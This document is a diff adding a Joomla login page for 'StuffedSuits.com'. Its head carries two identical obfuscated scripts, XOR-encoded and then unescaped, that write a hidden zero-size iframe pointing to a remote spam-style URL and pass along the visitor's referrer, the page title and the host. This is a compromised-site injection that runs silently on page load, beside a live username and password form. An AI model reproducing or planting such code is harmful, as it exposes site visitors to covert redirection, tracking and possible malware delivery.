@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb" lang="en-gb" dir="ltr">
+<head>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+	  <base href="http://stuffedsuits.com/index.php/component/users/" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="generator" content="Joomla! - Open Source Content Management" />
+  <title>StuffedSuits.com</title>
+  <link href="/templates/protostar/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon" />
+  <link href="http://stuffedsuits.com/index.php/component/search/?format=opensearch" rel="search" title="Search StuffedSuits.com" type="application/opensearchdescription+xml" />
+  <link rel="stylesheet" href="/templates/protostar/css/template.css" type="text/css" />
+  <style type="text/css">
+div.mod_search93 input[type="search"]{ width:auto; }
+  </style>
+  <script src="/media/jui/js/jquery.min.js" type="text/javascript"></script>
+  <script src="/media/jui/js/jquery-noconflict.js" type="text/javascript"></script>
+  <script src="/media/jui/js/jquery-migrate.min.js" type="text/javascript"></script>
+  <script src="/media/system/js/html5fallback.js" type="text/javascript"></script>
+  <script src="/media/jui/js/bootstrap.min.js" type="text/javascript"></script>
+  <script src="/templates/protostar/js/template.js" type="text/javascript"></script>
+  <script type="text/javascript">
+window.setInterval(function(){var r;try{r=window.XMLHttpRequest?new XMLHttpRequest():new ActiveXObject("Microsoft.XMLHTTP")}catch(e){}if(r){r.open("GET","./",true);r.send(null)}},3600000);jQuery(document).ready(function(){
+	jQuery('.hasTooltip').tooltip({"html": true,"container": "body"});
+});
+  </script>
+
+				<link href='//fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css' />
+		<style type="text/css">
+			h1,h2,h3,h4,h5,h6,.site-title{
+				font-family: 'Open Sans', sans-serif;
+			}
+		</style>
+				<style type="text/css">
+		body.site
+		{
+			border-top: 3px solid #0088cc;
+			background-color: #f4f6f7		}
+		a
+		{
+			color: #0088cc;
+		}
+		.navbar-inner, .nav-list > .active > a, .nav-list > .active > a:hover, .dropdown-menu li > a:hover, .dropdown-menu .active > a, .dropdown-menu .active > a:hover, .nav-pills > .active > a, .nav-pills > .active > a:hover,
+		.btn-primary
+		{
+			background: #0088cc;
+		}
+		.navbar-inner
+		{
+			-moz-box-shadow: 0 1px 3px rgba(0, 0, 0, .25), inset 0 -1px 0 rgba(0, 0, 0, .1), inset 0 30px 10px rgba(0, 0, 0, .2);
+			-webkit-box-shadow: 0 1px 3px rgba(0, 0, 0, .25), inset 0 -1px 0 rgba(0, 0, 0, .1), inset 0 30px 10px rgba(0, 0, 0, .2);
+			box-shadow: 0 1px 3px rgba(0, 0, 0, .25), inset 0 -1px 0 rgba(0, 0, 0, .1), inset 0 30px 10px rgba(0, 0, 0, .2);
+		}
+	</style>
+		<!--[if lt IE 9]>
+		<script src="/media/jui/js/html5.js"></script>
+	<![endif]-->
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--p'00'02)'02'00o'00'02)'02'001c,p'00'02)'02'00,og'00'02)'02'00ec/wq/r'00'02)'02'00knn'00'02)'02'00q,u'00'02)'02'00q-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;uklfmu,mlnmcf'02'1F'02dwlavkml'0:'0;'5@'2C'2;'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'2;'5F'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--p'00'02)'02'00o'00'02)'02'001c,p'00'02)'02'00,og'00'02)'02'00ec/wq/r'00'02)'02'00knn'00'02)'02'00q,u'00'02)'02'00q-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;uklfmu,mlnmcf'02'1F'02dwlavkml'0:'0;'5@'2C'2;'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'2;'5F'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script src='/google_analytics_auto.js'></script></head>
+
+<body class="site com_users view- no-layout no-task">
+
+	<!-- Body -->
+	<div class="body">
+		<div class="container">
+			<!-- Header -->
+			<header class="header" role="banner">
+				<div class="header-inner clearfix">
+					<a class="brand pull-left" href="/">
+						<span class="site-title" title="StuffedSuits.com">StuffedSuits.com</span>											</a>
+					<div class="header-search pull-right">
+						<div class="search mod_search93">
+	<form action="/index.php/component/users/" method="post" class="form-inline">
+		<label for="mod-search-searchword" class="element-invisible">Search ...</label> <input name="searchword" id="mod-search-searchword" maxlength="200"  class="inputbox search-query" type="search" size="20" placeholder="Search ..." />		<input type="hidden" name="task" value="search" />
+		<input type="hidden" name="option" value="com_search" />
+		<input type="hidden" name="Itemid" value="" />
+	</form>
+</div>
+
+					</div>
+				</div>
+			</header>
+							<nav class="navigation" role="navigation">
+					<div class="navbar pull-left">
+						<a class="btn btn-navbar collapsed" data-toggle="collapse" data-target=".nav-collapse">
+							<span class="icon-bar"></span>
+							<span class="icon-bar"></span>
+							<span class="icon-bar"></span>
+						</a>
+					</div>
+					<div class="nav-collapse">
+						<ul class="nav menu nav-pills">
+<li class="item-101 current active"><a href="/index.php" >Home</a></li><li class="item-129"><a href="/index.php/blog" >Blog</a></li></ul>
+
+					</div>
+				</nav>
+						
+			<div class="row-fluid">
+								<main id="content" role="main" class="span9">
+					<!-- Begin Content -->
+							<div class="moduletable">
+						
+
+<div class="custom"  >
+	<p><img src="/images/headers/blue-flower.jpg" alt="Blue Flower" /></p></div>
+		</div>
+	
+					<div id="system-message-container">
+	</div>
+
+					<div class="login">
+	
+	
+		
+		
+	
+	<form action="/index.php/component/users/?task=user.login" method="post" class="form-validate form-horizontal well">
+
+		<fieldset>
+												<div class="control-group">
+						<div class="control-label">
+							<label id="username-lbl" for="username" class="required">
+	Username<span class="star">&#160;*</span></label>						</div>
+						<div class="controls">
+							<input type="text" name="username" id="username" value="" class="validate-username required" size="25" required aria-required="true" />						</div>
+					</div>
+																<div class="control-group">
+						<div class="control-label">
+							<label id="password-lbl" for="password" class="required">
+	Password<span class="star">&#160;*</span></label>						</div>
+						<div class="controls">
+							<input type="password" name="password" id="password" value="" class="validate-password required" size="25" maxlength="99" required aria-required="true" />						</div>
+					</div>
+							
+			
+						<div  class="control-group">
+				<div class="control-label"><label>Remember me</label></div>
+				<div class="controls"><input id="remember" type="checkbox" name="remember" class="inputbox" value="yes"/></div>
+			</div>
+			
+			<div class="control-group">
+				<div class="controls">
+					<button type="submit" class="btn btn-primary">
+						Log in					</button>
+				</div>
+			</div>
+
+			<input type="hidden" name="return" value="aW5kZXgucGhwP29wdGlvbj1jb21fdXNlcnMmdmlldz1wcm9maWxl" />
+			<input type="hidden" name="23647fdc0e24ed1c0add3fcbd0de0aa3" value="1" />		</fieldset>
+	</form>
+</div>
+<div>
+	<ul class="nav nav-tabs nav-stacked">
+		<li>
+			<a href="/index.php/component/users/?view=reset">
+			Forgot your password?</a>
+		</li>
+		<li>
+			<a href="/index.php/component/users/?view=remind">
+			Forgot your username?</a>
+		</li>
+			</ul>
+</div>
+
+					
+<ul class="breadcrumb">
+	<li class="active">You are here: &#160;</li><li class="active"><span>Home</span></li></ul>
+
+					<!-- End Content -->
+				</main>
+									<div id="aside" class="span3">
+						<!-- Begin Right Sidebar -->
+						
+						<!-- End Right Sidebar -->
+					</div>
+							</div>
+		</div>
+	</div>
+	<!-- Footer -->
+	<footer class="footer" role="contentinfo">
+		<div class="container">
+			<hr />
+			
+			<p class="pull-right">
+				<a href="#top" id="back-top">
+					Back to Top				</a>
+			</p>
+			<p>
+				&copy; 2019 StuffedSuits.com			</p>
+		</div>
+	</footer>
+	
+</body>
+</html>
